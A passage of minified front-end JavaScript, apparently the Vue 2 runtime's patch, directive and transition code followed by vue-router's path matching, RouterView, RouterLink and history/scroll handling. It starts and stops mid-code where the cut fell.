d(n.elm)}function S(n,e,t,r){for(var a=t;a<r;a++){var i=e[a];if(o(i)&&jr(n,i))return a}}function j(n,e,t,a,l,c){if(n!==e){o(e.elm)&&o(a)&&(e=a[l]=fn(e));var d=e.elm=n.elm;if(s(n.isAsyncPlaceholder))o(e.asyncFactory.resolved)?T(n.elm,e,t):e.isAsyncPlaceholder=!0;else if(s(e.isStatic)&&s(n.isStatic)&&e.key===n.key&&(s(e.isCloned)||s(e.isOnce)))e.componentInstance=n.componentInstance;else{var u,g=e.data;o(g)&&o(u=g.hook)&&o(u=u.prepatch)&&u(n,e);var h=n.children,b=e.children;if(o(g)&&f(e)){for(u=0;u<r.update.length;++u)r.update[u](n,e);o(u=g.hook)&&o(u=u.update)&&u(n,e)}i(e.text)?o(h)&&o(b)?h!==b&&function(n,e,t,r,a){var s,l,c,d=0,u=0,g=e.length-1,h=e[0],f=e[g],b=t.length-1,v=t[0],y=t[b],w=!a;for(0;d<=g&&u<=b;)i(h)?h=e[++d]:i(f)?f=e[--g]:jr(h,v)?(j(h,v,r,t,u),h=e[++d],v=t[++u]):jr(f,y)?(j(f,y,r,t,b),f=e[--g],y=t[--b]):jr(h,y)?(j(h,y,r,t,b),w&&p.insertBefore(n,h.elm,p.nextSibling(f.elm)),h=e[++d],y=t[--b]):jr(f,v)?(j(f,v,r,t,u),w&&p.insertBefore(n,f.elm,h.elm),f=e[--g],v=t[++u]):(i(s)&&(s=Cr(e,d,g)),i(l=o(v.key)?s[v.key]:S(v,e,d,g))?m(v,r,n,h.elm,!1,t,u):jr(c=e[l],v)?(j(c,v,r,t,u),e[l]=void 0,w&&p.insertBefore(n,c.elm,h.elm)):m(v,r,n,h.elm,!1,t,u),v=t[++u]);d>g?x(n,i(t[b+1])?null:t[b+1].elm,t,u,b,r):u>b&&k(e,d,g)}(d,h,b,t,c):o(b)?(o(n.text)&&p.setTextContent(d,""),x(d,null,b,0,b.length-1,t)):o(h)?k(h,0,h.length-1):o(n.text)&&p.setTextContent(d,""):n.text!==e.text&&p.setTextContent(d,e.text),o(g)&&o(u=g.hook)&&o(u=u.postpatch)&&u(n,e)}}}function C(n,e,t){if(s(t)&&o(n.parent))n.parent.data.pendingInsert=e;else for(var r=0;r<e.length;++r)e[r].data.hook.insert(e[r])}var I=v("attrs,class,staticClass,staticStyle,key");function T(n,e,t,r){var a,i=e.tag,l=e.data,c=e.children;if(r=r||l&&l.pre,e.elm=n,s(e.isComment)&&o(e.asyncFactory))return e.isAsyncPlaceholder=!0,!0;if(o(l)&&(o(a=l.hook)&&o(a=a.init)&&a(e,!0),o(a=e.componentInstance)))return u(e,t),!0;if(o(i)){if(o(c))if(n.hasChildNodes())if(o(a=l)&&o(a=a.domProps)&&o(a=a.innerHTML)){if(a!==n.innerHTML)return!1}else{for(var p=!0,d=n.firstChild,m=0;m<c.length;m++){if(!d||!T(d,c[m],t,r)){p=!1;break}d=d.nextSibling}if(!p||d)return!1}else h(e,c,t);if(o(l)){var g=!1;for(var f in l)if(!I(f)){g=!0,b(e,t);break}!g&&l.class&&Ne(l.class)}}else n.data!==e.text&&(n.data=e.text);return!0}return function(n,e,t,a){if(!i(e)){var l,c=!1,d=[];if(i(n))c=!0,m(e,d);else{var u=o(n.nodeType);if(!u&&jr(n,e))j(n,e,d,null,null,a);else{if(u){if(1===n.nodeType&&n.hasAttribute("data-server-rendered")&&(n.removeAttribute("data-server-rendered"),t=!0),s(t)&&T(n,e,d))return C(e,d,!0),n;l=n,n=new un(p.tagName(l).toLowerCase(),{},[],void 0,l)}var g=n.elm,h=p.parentNode(g);if(m(e,d,g._leaveCb?null:h,p.nextSibling(g)),o(e.parent))for(var b=e.parent,v=f(e);b;){for(var y=0;y<r.destroy.length;++y)r.destroy[y](b);if(b.elm=e.elm,v){for(var x=0;x<r.create.length;++x)r.create[x](_r,b);var _=b.data.hook.insert;if(_.merged)for(var S=1;S<_.fns.length;S++)_.fns[S]()}else wr(b);b=b.parent}o(h)?k([n],0,0):o(n.tag)&&w(n)}}return C(e,d,c),e.elm}o(n)&&w(n)}}({nodeOps:yr,modules:[Or,Ur,Wr,Xr,sa,J?{create:za,activate:za,remove:function(n,e){!0!==n.data.show?Ta(n,e):e()}}:{}].concat(Mr)});Y&&document.addEventListener("selectionchange",(function(){var n=document.activeElement;n&&n.vmodel&&Ua(n,"input")}));var Ma={inserted:function(n,e,t,r){"select"===t.tag?(r.elm&&!r.elm._vOptions?Wn(t,"postpatch",(function(){Ma.componentUpdated(n,e,t)})):Pa(n,e,t.context),n._vOptions=[].map.call(n.options,Oa)):("textarea"===t.tag||vr(n.type))&&(n._vModifiers=e.modifiers,e.modifiers.lazy||(n.addEventListener("compositionstart",Da),n.addEventListener("compositionend",Ba),n.addEventListener("change",Ba),Y&&(n.vmodel=!0)))},componentUpdated:function(n,e,t){if("select"===t.tag){Pa(n,e,t.context);var r=n._vOptions,a=n._vOptions=[].map.call(n.options,Oa);if(a.some((function(n,e){return!R(n,r[e])})))(n.multiple?e.value.some((function(n){return Ra(n,a)})):e.value!==e.oldValue&&Ra(e.value,a))&&Ua(n,"change")}}};function Pa(n,e,t){La(n,e,t),(X||Z)&&setTimeout((function(){La(n,e,t)}),0)}function La(n,e,t){var r=e.value,a=n.multiple;if(!a||Array.isArray(r)){for(var i,o,s=0,l=n.options.length;s<l;s++)if(o=n.options[s],a)i=O(r,Oa(o))>-1,o.selected!==i&&(o.selected=i);else if(R(Oa(o),r))return void(n.selectedIndex!==s&&(n.selectedIndex=s));a||(n.selectedIndex=-1)}}function Ra(n,e){return e.every((function(e){return!R(e,n)}))}function Oa(n){return"_value"in n?n._value:n.value}function Da(n){n.target.composing=!0}function Ba(n){n.target.composing&&(n.target.composing=!1,Ua(n.target,"input"))}function Ua(n,e){var t=document.createEvent("HTMLEvents");t.initEvent(e,!0,!0),n.dispatchEvent(t)}function Fa(n){return!n.componentInstance||n.data&&n.data.transition?n:Fa(n.componentInstance._vnode)}var Na={model:Ma,show:{bind:function(n,e,t){var r=e.value,a=(t=Fa(t)).data&&t.data.transition,i=n.__vOriginalDisplay="none"===n.style.display?"":n.style.display;r&&a?(t.data.show=!0,Ia(t,(function(){n.style.display=i}))):n.style.display=r?i:"none"},update:function(n,e,t){var r=e.value;!r!=!e.oldValue&&((t=Fa(t)).data&&t.data.transition?(t.data.show=!0,r?Ia(t,(function(){n.style.display=n.__vOriginalDisplay})):Ta(t,(function(){n.style.display="none"}))):n.style.display=r?n.__vOriginalDisplay:"none")},unbind:function(n,e,t,r,a){a||(n.style.display=n.__vOriginalDisplay)}}},Ha={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function $a(n){var e=n&&n.componentOptions;return e&&e.Ctor.options.abstract?$a(Se(e.children)):n}function Va(n){var e={},t=n.$options;for(var r in t.propsData)e[r]=n[r];var a=t._parentListeners;for(var r in a)e[j(r)]=a[r];return e}function Ga(n,e){if(/\d-keep-alive$/.test(e.tag))return n("keep-alive",{props:e.componentOptions.propsData})}var Wa=function(n){return n.tag||ge(n)},Ja=function(n){return"show"===n.name},Qa={name:"transition",props:Ha,abstract:!0,render:function(n){var e=this,t=this.$slots.default;if(t&&(t=t.filter(Wa)).length){0;var r=this.mode;0;var a=t[0];if(function(n){for(;n=n.parent;)if(n.data.transition)return!0}(this.$vnode))return a;var i=$a(a);if(!i)return a;if(this._leaving)return Ga(n,a);var o="__transition-".concat(this._uid,"-");i.key=null==i.key?i.isComment?o+"comment":o+i.tag:l(i.key)?0===String(i.key).indexOf(o)?i.key:o+i.key:i.key;var s=(i.data||(i.data={})).transition=Va(this),c=this._vnode,p=$a(c);if(i.data.directives&&i.data.directives.some(Ja)&&(i.data.show=!0),p&&p.data&&!function(n,e){return e.key===n.key&&e.tag===n.tag}(i,p)&&!ge(p)&&(!p.componentInstance||!p.componentInstance._vnode.isComment)){var d=p.data.transition=z({},s);if("out-in"===r)return this._leaving=!0,Wn(d,"afterLeave",(function(){e._leaving=!1,e.$forceUpdate()})),Ga(n,a);if("in-out"===r){if(ge(i))return c;var m,u=function(){m()};Wn(s,"afterEnter",u),Wn(s,"enterCancelled",u),Wn(d,"delayLeave",(function(n){m=n}))}}return a}}},Xa=z({tag:String,moveClass:String},Ha);function Ya(n){n.elm._moveCb&&n.elm._moveCb(),n.elm._enterCb&&n.elm._enterCb()}function Za(n){n.data.newPos=n.elm.getBoundingClientRect()}function Ka(n){var e=n.data.pos,t=n.data.newPos,r=e.left-t.left,a=e.top-t.top;if(r||a){n.data.moved=!0;var i=n.elm.style;i.transform=i.WebkitTransform="translate(".concat(r,"px,").concat(a,"px)"),i.transitionDuration="0s"}}delete Xa.mode;var ni={Transition:Qa,TransitionGroup:{props:Xa,beforeMount:function(){var n=this,e=this._update;this._update=function(t,r){var a=Ye(n);n.__patch__(n._vnode,n.kept,!1,!0),n._vnode=n.kept,a(),e.call(n,t,r)}},render:function(n){for(var e=this.tag||this.$vnode.data.tag||"span",t=Object.create(null),r=this.prevChildren=this.children,a=this.$slots.default||[],i=this.children=[],o=Va(this),s=0;s<a.length;s++){if((p=a[s]).tag)if(null!=p.key&&0!==String(p.key).indexOf("__vlist"))i.push(p),t[p.key]=p,(p.data||(p.data={})).transition=o;else;}if(r){var l=[],c=[];for(s=0;s<r.length;s++){var p;(p=r[s]).data.transition=o,p.data.pos=p.elm.getBoundingClientRect(),t[p.key]?l.push(p):c.push(p)}this.kept=n(e,null,l),this.removed=c}return n(e,null,i)},updated:function(){var n=this.prevChildren,e=this.moveClass||(this.name||"v")+"-move";n.length&&this.hasMove(n[0].elm,e)&&(n.forEach(Ya),n.forEach(Za),n.forEach(Ka),this._reflow=document.body.offsetHeight,n.forEach((function(n){if(n.data.moved){var t=n.elm,r=t.style;xa(t,e),r.transform=r.WebkitTransform=r.transitionDuration="",t.addEventListener(ha,t._moveCb=function n(r){r&&r.target!==t||r&&!/transform$/.test(r.propertyName)||(t.removeEventListener(ha,n),t._moveCb=null,wa(t,e))})}})))},methods:{hasMove:function(n,e){if(!ua)return!1;if(this._hasMove)return this._hasMove;var t=n.cloneNode();n._transitionClasses&&n._transitionClasses.forEach((function(n){pa(t,n)})),ca(t,e),t.style.display="none",this.$el.appendChild(t);var r=Sa(t);return this.$el.removeChild(t),this._hasMove=r.hasTransform}}}};function ei(n,e){for(var t in e)n[t]=e[t];return n}Gt.config.mustUseProp=function(n,e,t){return"value"===t&&er(n)&&"button"!==e||"selected"===t&&"option"===n||"checked"===t&&"input"===n||"muted"===t&&"video"===n},Gt.config.isReservedTag=fr,Gt.config.isReservedAttr=nr,Gt.config.getTagNamespace=function(n){return hr(n)?"svg":"math"===n?"math":void 0},Gt.config.isUnknownElement=function(n){if(!J)return!0;if(fr(n))return!1;if(n=n.toLowerCase(),null!=br[n])return br[n];var e=document.createElement(n);return n.indexOf("-")>-1?br[n]=e.constructor===window.HTMLUnknownElement||e.constructor===window.HTMLElement:br[n]=/HTMLUnknownElement/.test(e.toString())},z(Gt.options.directives,Na),z(Gt.options.components,ni),Gt.prototype.__patch__=J?qa:M,Gt.prototype.$mount=function(n,e){return function(n,e,t){var r;n.$el=e,n.$options.render||(n.$options.render=gn),nt(n,"beforeMount"),r=function(){n._update(n._render(),t)},new Ve(n,r,M,{before:function(){n._isMounted&&!n._isDestroyed&&nt(n,"beforeUpdate")}},!0),t=!1;var a=n._preWatchers;if(a)for(var i=0;i<a.length;i++)a[i].run();return null==n.$vnode&&(n._isMounted=!0,nt(n,"mounted")),n}(this,n=n&&J?function(n){if("string"==typeof n){var e=document.querySelector(n);return e||document.createElement("div")}return n}(n):void 0,e)},J&&setTimeout((function(){N.devtools&&sn&&sn.emit("init",Gt)}),0);var ti=/[!'()*]/g,ri=function(n){return"%"+n.charCodeAt(0).toString(16)},ai=/%2C/g,ii=function(n){return encodeURIComponent(n).replace(ti,ri).replace(ai,",")};function oi(n){try{return decodeURIComponent(n)}catch(n){0}return n}var si=function(n){return null==n||"object"==typeof n?n:String(n)};function li(n){var e={};return(n=n.trim().replace(/^(\?|#|&)/,""))?(n.split("&").forEach((function(n){var t=n.replace(/\+/g," ").split("="),r=oi(t.shift()),a=t.length>0?oi(t.join("=")):null;void 0===e[r]?e[r]=a:Array.isArray(e[r])?e[r].push(a):e[r]=[e[r],a]})),e):e}function ci(n){var e=n?Object.keys(n).map((function(e){var t=n[e];if(void 0===t)return"";if(null===t)return ii(e);if(Array.isArray(t)){var r=[];return t.forEach((function(n){void 0!==n&&(null===n?r.push(ii(e)):r.push(ii(e)+"="+ii(n)))})),r.join("&")}return ii(e)+"="+ii(t)})).filter((function(n){return n.length>0})).join("&"):null;return e?"?"+e:""}var pi=/\/?$/;function di(n,e,t,r){var a=r&&r.options.stringifyQuery,i=e.query||{};try{i=mi(i)}catch(n){}var o={name:e.name||n&&n.name,meta:n&&n.meta||{},path:e.path||"/",hash:e.hash||"",query:i,params:e.params||{},fullPath:hi(e,a),matched:n?gi(n):[]};return t&&(o.redirectedFrom=hi(t,a)),Object.freeze(o)}function mi(n){if(Array.isArray(n))return n.map(mi);if(n&&"object"==typeof n){var e={};for(var t in n)e[t]=mi(n[t]);return e}return n}var ui=di(null,{path:"/"});function gi(n){for(var e=[];n;)e.unshift(n),n=n.parent;return e}function hi(n,e){var t=n.path,r=n.query;void 0===r&&(r={});var a=n.hash;return void 0===a&&(a=""),(t||"/")+(e||ci)(r)+a}function fi(n,e,t){return e===ui?n===e:!!e&&(n.path&&e.path?n.path.replace(pi,"")===e.path.replace(pi,"")&&(t||n.hash===e.hash&&bi(n.query,e.query)):!(!n.name||!e.name)&&(n.name===e.name&&(t||n.hash===e.hash&&bi(n.query,e.query)&&bi(n.params,e.params))))}function bi(n,e){if(void 0===n&&(n={}),void 0===e&&(e={}),!n||!e)return n===e;var t=Object.keys(n).sort(),r=Object.keys(e).sort();return t.length===r.length&&t.every((function(t,a){var i=n[t];if(r[a]!==t)return!1;var o=e[t];return null==i||null==o?i===o:"object"==typeof i&&"object"==typeof o?bi(i,o):String(i)===String(o)}))}function vi(n){for(var e=0;e<n.matched.length;e++){var t=n.matched[e];for(var r in t.instances){var a=t.instances[r],i=t.enteredCbs[r];if(a&&i){delete t.enteredCbs[r];for(var o=0;o<i.length;o++)a._isBeingDestroyed||i[o](a)}}}}var yi={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,r=e.children,a=e.parent,i=e.data;i.routerView=!0;for(var o=a.$createElement,s=t.name,l=a.$route,c=a._routerViewCache||(a._routerViewCache={}),p=0,d=!1;a&&a._routerRoot!==a;){var m=a.$vnode?a.$vnode.data:{};m.routerView&&p++,m.keepAlive&&a._directInactive&&a._inactive&&(d=!0),a=a.$parent}if(i.routerViewDepth=p,d){var u=c[s],g=u&&u.component;return g?(u.configProps&&xi(g,i,u.route,u.configProps),o(g,i,r)):o()}var h=l.matched[p],f=h&&h.components[s];if(!h||!f)return c[s]=null,o();c[s]={component:f},i.registerRouteInstance=function(n,e){var t=h.instances[s];(e&&t!==n||!e&&t===n)&&(h.instances[s]=e)},(i.hook||(i.hook={})).prepatch=function(n,e){h.instances[s]=e.componentInstance},i.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==h.instances[s]&&(h.instances[s]=n.componentInstance),vi(l)};var b=h.props&&h.props[s];return b&&(ei(c[s],{route:l,configProps:b}),xi(f,i,l,b)),o(f,i,r)}};function xi(n,e,t,r){var a=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,r);if(a){a=e.props=ei({},a);var i=e.attrs=e.attrs||{};for(var o in a)n.props&&o in n.props||(i[o]=a[o],delete a[o])}}function wi(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var i=n.replace(/^\//,"").split("/"),o=0;o<i.length;o++){var s=i[o];".."===s?a.pop():"."!==s&&a.push(s)}return""!==a[0]&&a.unshift(""),a.join("/")}function ki(n){return n.replace(/\/(?:\s*\/)+/g,"/")}var _i=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},Si=Di,ji=Ai,Ci=function(n,e){return qi(Ai(n,e),e)},Ii=qi,Ti=Oi,Ei=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function Ai(n,e){for(var t,r=[],a=0,i=0,o="",s=e&&e.delimiter||"/";null!=(t=Ei.exec(n));){var l=t[0],c=t[1],p=t.index;if(o+=n.slice(i,p),i=p+l.length,c)o+=c[1];else{var d=n[i],m=t[2],u=t[3],g=t[4],h=t[5],f=t[6],b=t[7];o&&(r.push(o),o="");var v=null!=m&&null!=d&&d!==m,y="+"===f||"*"===f,x="?"===f||"*"===f,w=t[2]||s,k=g||h;r.push({name:u||a++,prefix:m||"",delimiter:w,optional:x,repeat:y,partial:v,asterisk:!!b,pattern:k?Pi(k):b?".*":"[^"+Mi(w)+"]+?"})}}return i<n.length&&(o+=n.substr(i)),o&&r.push(o),r}function zi(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function qi(n,e){for(var t=new Array(n.length),r=0;r<n.length;r++)"object"==typeof n[r]&&(t[r]=new RegExp("^(?:"+n[r].pattern+")$",Ri(e)));return function(e,r){for(var a="",i=e||{},o=(r||{}).pretty?zi:encodeURIComponent,s=0;s<n.length;s++){var l=n[s];if("string"!=typeof l){var c,p=i[l.name];if(null==p){if(l.optional){l.partial&&(a+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(_i(p)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(p)+"`");if(0===p.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var d=0;d<p.length;d++){if(c=o(p[d]),!t[s].test(c))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(c)+"`");a+=(0===d?l.prefix:l.delimiter)+c}}else{if(c=l.asterisk?encodeURI(p).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):o(p),!t[s].test(c))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+c+'"');a+=l.prefix+c}}else a+=l}return a}}function Mi(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function Pi(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function Li(n,e){return n.keys=e,n}function Ri(n){return n&&n.sensitive?"":"i"}function Oi(n,e,t){_i(e)||(t=e||t,e=[]);for(var r=(t=t||{}).strict,a=!1!==t.end,i="",o=0;o<n.length;o++){var s=n[o];if("string"==typeof s)i+=Mi(s);else{var l=Mi(s.prefix),c="(?:"+s.pattern+")";e.push(s),s.repeat&&(c+="(?:"+l+c+")*"),i+=c=s.optional?s.partial?l+"("+c+")?":"(?:"+l+"("+c+"))?":l+"("+c+")"}}var p=Mi(t.delimiter||"/"),d=i.slice(-p.length)===p;return r||(i=(d?i.slice(0,-p.length):i)+"(?:"+p+"(?=$))?"),i+=a?"$":r&&d?"":"(?="+p+"|$)",Li(new RegExp("^"+i,Ri(t)),e)}function Di(n,e,t){return _i(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var r=0;r<t.length;r++)e.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return Li(n,e)}(n,e):_i(n)?function(n,e,t){for(var r=[],a=0;a<n.length;a++)r.push(Di(n[a],e,t).source);return Li(new RegExp("(?:"+r.join("|")+")",Ri(t)),e)}(n,e,t):function(n,e,t){return Oi(Ai(n,t),e,t)}(n,e,t)}Si.parse=ji,Si.compile=Ci,Si.tokensToFunction=Ii,Si.tokensToRegExp=Ti;var Bi=Object.create(null);function Ui(n,e,t){e=e||{};try{var r=Bi[n]||(Bi[n]=Si.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),r(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function Fi(n,e,t,r){var a="string"==typeof n?{path:n}:n;if(a._normalized)return a;if(a.name){var i=(a=ei({},n)).params;return i&&"object"==typeof i&&(a.params=ei({},i)),a}if(!a.path&&a.params&&e){(a=ei({},a))._normalized=!0;var o=ei(ei({},e.params),a.params);if(e.name)a.name=e.name,a.params=o;else if(e.matched.length){var s=e.matched[e.matched.length-1].path;a.path=Ui(s,o,e.path)}else 0;return a}var l=function(n){var e="",t="",r=n.indexOf("#");r>=0&&(e=n.slice(r),n=n.slice(0,r));var a=n.indexOf("?");return a>=0&&(t=n.slice(a+1),n=n.slice(0,a)),{path:n,query:t,hash:e}}(a.path||""),c=e&&e.path||"/",p=l.path?wi(l.path,c,t||a.append):c,d=function(n,e,t){void 0===e&&(e={});var r,a=t||li;try{r=a(n||"")}catch(n){r={}}for(var i in e){var o=e[i];r[i]=Array.isArray(o)?o.map(si):si(o)}return r}(l.query,a.query,r&&r.options.parseQuery),m=a.hash||l.hash;return m&&"#"!==m.charAt(0)&&(m="#"+m),{_normalized:!0,path:p,query:d,hash:m}}var Ni,Hi=function(){},$i={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,r=this.$route,a=t.resolve(this.to,r,this.append),i=a.location,o=a.route,s=a.href,l={},c=t.options.linkActiveClass,p=t.options.linkExactActiveClass,d=null==c?"router-link-active":c,m=null==p?"router-link-exact-active":p,u=null==this.activeClass?d:this.activeClass,g=null==this.exactActiveClass?m:this.exactActiveClass,h=o.redirectedFrom?di(null,Fi(o.redirectedFrom),null,t):o;l[g]=fi(r,h,this.exactPath),l[u]=this.exact||this.exactPath?l[g]:function(n,e){return 0===n.path.replace(pi,"/").indexOf(e.path.replace(pi,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(r,h);var f=l[g]?this.ariaCurrentValue:null,b=function(n){Vi(n)&&(e.replace?t.replace(i,Hi):t.push(i,Hi))},v={click:Vi};Array.isArray(this.event)?this.event.forEach((function(n){v[n]=b})):v[this.event]=b;var y={class:l},x=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:s,route:o,navigate:b,isActive:l[u],isExactActive:l[g]});if(x){if(1===x.length)return x[0];if(x.length>1||!x.length)return 0===x.length?n():n("span",{},x)}if("a"===this.tag)y.on=v,y.attrs={href:s,"aria-current":f};else{var w=function n(e){var t;if(e)for(var r=0;r<e.length;r++){if("a"===(t=e[r]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(w){w.isStatic=!1;var k=w.data=ei({},w.data);for(var _ in k.on=k.on||{},k.on){var S=k.on[_];_ in v&&(k.on[_]=Array.isArray(S)?S:[S])}for(var j in v)j in k.on?k.on[j].push(v[j]):k.on[j]=b;var C=w.data.attrs=ei({},w.data.attrs);C.href=s,C["aria-current"]=f}else y.on=v}return n(this.tag,y,this.$slots.default)}};function Vi(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var Gi="undefined"!=typeof window;function Wi(n,e,t,r,a){var i=e||[],o=t||Object.create(null),s=r||Object.create(null);n.forEach((function(n){!function n(e,t,r,a,i,o){var s=a.path,l=a.name;0;var c=a.pathToRegexpOptions||{},p=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return ki(e.path+"/"+n)}(s,i,c.strict);"boolean"==typeof a.caseSensitive&&(c.sensitive=a.caseSensitive);var d={path:p,regex:Ji(p,c),components:a.components||{default:a.component},alias:a.alias?"string"==typeof a.alias?[a.alias]:a.alias:[],instances:{},enteredCbs:{},name:l,parent:i,matchAs:o,redirect:a.redirect,beforeEnter:a.beforeEnter,meta:a.meta||{},props:null==a.props?{}:a.components?a.props:{default:a.props}};a.children&&a.children.forEach((function(a){var i=o?ki(o+"/"+a.path):void 0;n(e,t,r,a,d,i)}));t[d.path]||(e.push(d.path),t[d.path]=d);if(void 0!==a.alias)for(var m=Array.isArray(a.alias)?a.alias:[a.alias],u=0;u<m.length;++u){0;var g={path:m[u],children:a.children};n(e,t,r,g,i,d.path||"/")}l&&(r[l]||(r[l]=d))}(i,o,s,n,a)}));for(var l=0,c=i.length;l<c;l++)"*"===i[l]&&(i.push(i.splice(l,1)[0]),c--,l--);return{pathList:i,pathMap:o,nameMap:s}}function Ji(n,e){return Si(n,[],e)}function Qi(n,e){var t=Wi(n),r=t.pathList,a=t.pathMap,i=t.nameMap;function o(n,t,o){var s=Fi(n,t,!1,e),c=s.name;if(c){var p=i[c];if(!p)return l(null,s);var d=p.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var m in t.params)!(m in s.params)&&d.indexOf(m)>-1&&(s.params[m]=t.params[m]);return s.path=Ui(p.path,s.params),l(p,s,o)}if(s.path){s.params={};for(var u=0;u<r.length;u++){var g=r[u],h=a[g];if(Xi(h.regex,s.path,s.params))return l(h,s,o)}}return l(null,s)}function s(n,t){var r=n.redirect,a="function"==typeof r?r(di(n,t,null,e)):r;if("string"==typeof a&&(a={path:a}),!a||"object"!=typeof a)return l(null,t);var s=a,c=s.name,p=s.path,d=t.query,m=t.hash,u=t.params;if(d=s.hasOwnProperty("query")?s.query:d,m=s.hasOwnProperty("hash")?s.hash:m,u=s.hasOwnProperty("params")?s.params:u,c){i[c];return o({_normalized:!0,name:c,query:d,hash:m,params:u},void 0,t)}if(p){var g=function(n,e){return wi(n,e.parent?e.parent.path:"/",!0)}(p,n);return o({_normalized:!0,path:Ui(g,u),query:d,hash:m},void 0,t)}return l(null,t)}function l(n,t,r){return n&&n.redirect?s(n,r||t):n&&n.matchAs?function(n,e,t){var r=o({_normalized:!0,path:Ui(t,e.params)});if(r){var a=r.matched,i=a[a.length-1];return e.params=r.params,l(i,e)}return l(null,e)}(0,t,n.matchAs):di(n,t,r,e)}return{match:o,addRoute:function(n,e){var t="object"!=typeof n?i[n]:void 0;Wi([e||n],r,a,i,t),t&&t.alias.length&&Wi(t.alias.map((function(n){return{path:n,children:[e]}})),r,a,i,t)},getRoutes:function(){return r.map((function(n){return a[n]}))},addRoutes:function(n){Wi(n,r,a,i)}}}function Xi(n,e,t){var r=e.match(n);if(!r)return!1;if(!t)return!0;for(var a=1,i=r.length;a<i;++a){var o=n.keys[a-1];o&&(t[o.name||"pathMatch"]="string"==typeof r[a]?oi(r[a]):r[a])}return!0}var Yi=Gi&&window.performance&&window.performance.now?window.performance:Date;function Zi(){return Yi.now().toFixed(3)}var Ki=Zi();function no(){return Ki}function eo(n){return Ki=n}var to=Object.create(null);function ro(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=ei({},window.history.state);return t.key=no(),window.history.replaceState(t,"",e),window.addEventListener("popstate",oo),function(){window.removeEventListener("popstate",oo)}}function ao(n,e,t,r){if(n.app){var a=n.options.scrollBehavior;a&&n.app.$nextTick((function(){var i=function(){var n=no();if(n)return to[n]}(),o=a.call(n,e,t,r?i:null);o&&("function"==typeof o.then?o.then((function(n){mo(n,i)})).catch((function(n){0})):mo(o,i))}))}}function io(){var n=no();n&&(to[n]={x:window.pageXOffset,y:window.pageYOffset})}function oo(n){io(),n.state&&n.state.key&&eo(n.state.key)}function so(n){return co(n.x)||co(n.y)}function lo(n){return{x:co(n.x)?n.x:window.pageXOffset,y:co(n.y)?n.y:window.pageYOffset}}function co(n){return"number"==typeof n}var po=/^#\d/;function mo(n,e){var t,r="object"==typeof n;if(r&&"string"==typeof n.selector){var a=po.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(a){var i=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),r=n.getBoundingClientRect();return{x:r.left-t.left-e.x,y:r.top-t.top-e.y}}(a,i={x:co((t=i).x)?t.x:0,y:co(t.y)?t.y:0})}else so(n)&&(e=lo(n))}else r&&so(n)&&(e=lo(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var uo,go=Gi&&((-1===(uo=window.navigator.userAgent).indexOf("Android 2.")&&-1===uo.indexOf("Android 4.0")||-1===uo.indexOf("Mobile Safari")||-1!==uo.indexOf("Chrome")||-1!==uo.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function ho(n,e){io();var t=window.history;try{if(e){var r=ei({},t.state);r.key=no(),t.replaceState(r,"",n)}else t.pushState({key:eo(Zi())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function fo(n){ho(n,!0)}var 